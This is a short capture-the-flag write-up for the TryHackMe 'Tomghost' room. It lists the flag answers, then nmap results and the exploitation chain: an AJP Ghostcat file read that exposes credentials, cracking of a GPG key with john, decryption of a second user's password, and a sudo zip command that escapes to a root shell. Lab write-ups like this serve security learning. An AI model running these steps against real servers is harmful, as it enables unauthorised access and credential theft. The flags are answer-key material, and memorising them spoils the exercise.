# Tomghost
##### Question 1: user flag
Answer
```bash
THM{GhostCat_1s_so_cr4sy}
```

##### Question 2:Root Flag
Answer
```bash
THM{Z1P_1S_FAKE}
```

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

Nmap Scans:
```bash

Nmap scan report for 10.10.132.127
Host is up (0.10s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.30
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:

```


Get Creds
```bash
python3 ajpShooter.py http://10.10.132.127:8080 8009 /WEB-INF/web.xml read

skyfuck:8730281lkjlkjdqlksalks

```

ssh creds:
skyfuck:8730281lkjlkjdqlksalks

```bash
# Convert to john
gpg2john key.txt > hash.txt

# Crack
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
(alexandru)

# import key
gpg --import tryhackme.asc

# Decrypt creds
gpg --decrypt credential.pgp

# Merlin Creds

merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

```bash
privesc - sudo


TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF

```